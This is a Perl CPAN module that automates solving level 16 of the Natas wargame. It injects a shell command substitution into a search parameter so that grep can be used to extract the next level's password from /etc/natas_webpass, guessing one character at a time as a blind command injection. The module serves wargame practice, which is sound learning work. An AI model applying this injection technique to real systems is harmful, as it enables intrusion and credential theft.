package Hack::Natas::16;
use strict;
use warnings;
use v5.16.0;
our $VERSION = '0.003'; # VERSION
# ABSTRACT: solve level 16 of the Natas server-side security war games

use Carp qw(confess);
use Moo 1.003000; # RT#82711
with qw(Hack::Natas Hack::Natas::IncrementalSearch);


sub BUILDARGS {
    my %args  = @_[1..$#_];
    return { level => 16, http_pass => $args{http_pass} };
}


sub get_password_length { 32 }


sub response_to_boolean {
    my $self = shift;
    my $res  = $self->get( @_ );

    if (!$res->{success}) {
        use Data::Dumper;
        confess Dumper $res;
    }
    elsif ($res->{content} =~ m/^hacker$/m) {
        return 0;
    }
    else {
        return 1;
    }

}


sub guess_next_char {
    my $self = shift;
    my $inject = '$(grep -E ^%s /etc/natas_webpass/natas17)hacker';

    CHAR:
    foreach my $char ('a'..'z', 'A'..'Z', 0..9) {
        printf "\rGuessing: %s%s", $self->password_so_far, $char;

        if ( $self->response_to_boolean(needle => sprintf($inject, $self->password_so_far . $char)) ) {
            return $char;
        }
        else {
            next CHAR;
        }
    }
    confess sprintf q/Couldn't guess next char; password so far is %s/, $self->password_so_far;
}

1;

__END__

=pod

=encoding utf-8

=head1 NAME

Hack::Natas::16 - solve level 16 of the Natas server-side security war games

=head1 VERSION

version 0.003

=head1 DESCRIPTION

This class will solve level 16.

=head1 METHODS

=head2 get_password_length

This level has a 32-character password.

=head2 response_to_boolean

Does an HTTP GET of the resource described by the key-value
pairs, and then parses the response. If it contains the
string C<hacker>, then return false; otherwise, return true.

=head2 guess_next_char

Guesses the next character of the password being extracted. This
method ignores the current position into the password, as the
part of the password extracted thus far is sufficient to continue
the search.

=for Pod::Coverage BUILDARGS

=head1 AVAILABILITY

The project homepage is L<https://hashbang.ca/tag/natas>.

The latest version of this module is available from the Comprehensive Perl
Archive Network (CPAN). Visit L<http://www.perl.com/CPAN/> to find a CPAN
site near you, or see L<https://metacpan.org/module/Hack::Natas/>.

=head1 SOURCE

The development version is on github at L<http://github.com/doherty/Hack-Natas>
and may be cloned from L<git://github.com/doherty/Hack-Natas.git>

=head1 BUGS AND LIMITATIONS

You can make new bug reports, and view existing ones, through the
web interface at L<https://github.com/doherty/Hack-Natas/issues>.

=head1 AUTHOR

Mike Doherty <doherty@cpan.org>

=head1 COPYRIGHT AND LICENSE

This software is copyright (c) 2013 by Mike Doherty.

This is free software; you can redistribute it and/or modify it under
the same terms as the Perl 5 programming language system itself.

=cut
